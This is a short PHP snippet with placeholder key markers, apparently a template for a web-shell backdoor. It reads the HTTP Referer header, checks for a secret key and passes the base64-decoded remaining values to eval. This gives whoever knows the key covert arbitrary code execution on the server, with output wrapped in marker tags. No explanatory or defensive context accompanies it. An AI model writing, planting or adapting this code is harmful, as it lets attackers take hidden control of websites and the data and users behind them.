parse_str($_SERVER['HTTP_REFERER'],$a); 
if(reset($a)=='%%%START_KEY%%%') { 
echo '<%%%END_KEY%%%>';
eval(base64_decode(join(array_slice($a,1))));
echo '</%%%END_KEY%%%>';
}